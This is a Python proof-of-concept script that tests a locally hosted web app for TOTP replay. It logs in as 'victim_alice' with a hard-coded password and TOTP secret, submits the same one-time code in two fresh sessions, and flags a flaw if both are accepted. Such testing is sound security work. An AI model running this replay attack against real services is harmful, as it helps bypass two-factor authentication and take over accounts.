import http.cookiejar
import re
import urllib.parse
import urllib.request
import pyotp

BASE_URL = "http://127.0.0.1:5000"
totp_secret = "EZ6NAKNUOHT2PXGHGCZJ77X6I5I5Z53N"

def login_and_verify(otp_code):
    cj = http.cookiejar.CookieJar(policy=http.cookiejar.DefaultCookiePolicy(secure_protocols=("https", "http")))
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def http_error_302(self, req, fp, code, msg, headers):
            return fp

    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), NoRedirect())
    
    # Stage 1 Login
    lp = opener.open(f"{BASE_URL}/login").read().decode("utf-8")
    csrf_l = re.search(r'name="csrf_token"\s+value="([^"]+)"', lp).group(1)
    opener.open(urllib.request.Request(
        f"{BASE_URL}/loginsubmit",
        data=urllib.parse.urlencode({"csrf_token": csrf_l, "username": "victim_alice", "password": "PwnedPassword2026!"}).encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
    ))

    # Stage 2 OTP
    op = opener.open(f"{BASE_URL}/verify-otp").read().decode("utf-8")
    csrf_o = re.search(r'name="csrf_token"\s+value="([^"]+)"', op).group(1)
    res = opener.open(urllib.request.Request(
        f"{BASE_URL}/verify-otp",
        data=urllib.parse.urlencode({"csrf_token": csrf_o, "otp": otp_code}).encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
    ))
    return res.status, res.headers.get("Location")

print("=" * 60)
print("TESTING TOTP TOKEN REPLAY ATTACK")
print("=" * 60)

current_otp = pyotp.TOTP(totp_secret).now()
print(f"Generated Single Valid OTP: {current_otp}")

# Use 1: First login
s1, loc1 = login_and_verify(current_otp)
print(f"[Use 1] Status: {s1}, Redirect: {loc1}")

# Use 2: Replay the EXACT SAME OTP in a completely fresh session immediately
s2, loc2 = login_and_verify(current_otp)
print(f"[Use 2 (Replay)] Status: {s2}, Redirect: {loc2}")

if s1 == 302 and loc1.endswith("/dashboard") and s2 == 302 and loc2.endswith("/dashboard"):
    print("[!] CRITICAL FLAW CONFIRMED: The exact same OTP code was successfully accepted TWICE!")
    print("    RFC 6238 Section 5.2 violation: The server does not track used TOTP tokens.")
else:
    print("[-] Replay was rejected.")
